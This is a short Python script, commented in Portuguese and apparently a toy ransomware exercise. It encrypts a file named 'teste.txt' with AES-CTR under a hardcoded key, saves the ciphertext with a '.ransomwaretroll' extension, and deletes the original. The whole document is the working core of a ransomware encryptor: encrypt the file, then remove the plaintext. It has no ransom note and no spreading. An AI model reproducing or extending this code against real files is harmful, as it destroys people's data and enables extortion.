import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Abrir o arquivo para leitura binária
with open(file_name, "rb") as file:
    file_data = file.read()

# Chave de criptografia (deve ser 16, 24 ou 32 bytes)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar os dados do arquivo
crypto_data = aes.encrypt(file_data)

# Nome do novo arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"

# Salvar o arquivo criptografado
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)

# Remover o arquivo original
os.remove(file_name)
